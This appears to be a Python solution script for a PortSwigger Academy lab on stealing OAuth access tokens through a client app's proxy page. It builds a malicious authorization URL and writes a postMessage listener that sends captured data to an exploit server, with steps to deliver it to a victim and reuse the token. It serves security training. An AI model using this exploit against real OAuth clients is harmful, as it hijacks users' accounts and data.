"""
Lab 5: Stealing OAuth access tokens via a proxy page
https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page
Difficulty: Practitioner

📝 The flaw: no open redirect this time, but the client app has a "proxy" page
(e.g. /auth/callback-proxy or similar) that's registered as a VALID
redirect_uri and reflects the fragment onward. It loads an external resource
(ad/analytics script) that leaks the current URL — fragment included — via
document.location or postMessage, straight to attacker-controlled JS.
"""

from urllib.parse import quote

from utils import get_session, log, note

CLIENT_APP = "https://YOUR-LAB-ID.web-security-academy.net"
PROVIDER = "https://oauth-YOUR-LAB-ID.oauth-server.net"
EXPLOIT_SERVER = "https://exploit-YOUR-LAB-ID.exploit-server.net"
CLIENT_ID = "REPLACE_WITH_CLIENT_ID"
PROXY_PATH = "/auth/callback-proxy"  # confirm exact path from Burp history / page source


def build_malicious_auth_url():
    note("redirect_uri points at the client app's OWN registered proxy page —")
    note("passes provider validation — which then leaks the fragment for us.")

    redirect_uri = f"{CLIENT_APP}{PROXY_PATH}#{EXPLOIT_SERVER}/exploit"
    auth_url = (
        f"{PROVIDER}/auth"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={quote(redirect_uri, safe=':/#')}"
        f"&response_type=token"
        f"&nonce=123"
        f"&scope=openid%20profile%20email"
    )
    log(f"Malicious auth URL: {auth_url}")
    return auth_url


def build_capture_page():
    """
    Minimal listener for the exploit server's /exploit path — the proxy page's
    postMessage (or referer leak) lands here; log whatever arrives.
    """
    return """<script>
window.addEventListener('message', function(e) {
  fetch('/log?data=' + encodeURIComponent(JSON.stringify(e.data)));
});
</script>"""


def run():
    build_malicious_auth_url()
    html = build_capture_page()

    out_path = "proxy_page_listener.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote postMessage listener to {out_path}")

    note("Host the listener at /exploit, confirm the proxy page's leak mechanism")
    note("in Burp first (postMessage vs referer vs direct nav) and adjust the")
    note("listener accordingly. Deliver the auth URL to the victim, capture the")
    note("token, then use it exactly as in Lab 4 to read their API key.")


if __name__ == "__main__":
    run()
